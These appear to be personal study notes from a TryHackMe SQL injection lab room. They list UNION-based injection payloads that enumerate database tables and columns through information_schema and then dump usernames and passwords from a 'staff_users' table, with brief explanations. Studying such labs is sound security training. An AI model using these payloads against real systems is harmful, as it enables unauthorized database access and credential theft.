# Notes

<hr class="sep-both">

## SQLi

* https://tryhackme.com/room/sqlinjectionlm
* UNION: same type too!
* `'` to discover if an attack is possible
* `';-- -`
* `0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'`: `article,staff_users`
* The next thing is the information_schema database; every user of the database has access to this, and it contains information about all the databases and tables the user has access to. In this particular query, we're interested in listing all the tables in the sqli_one database, which is article and staff_users. 
* `0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'`
* `0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users`
* In-Band (error+union): same channel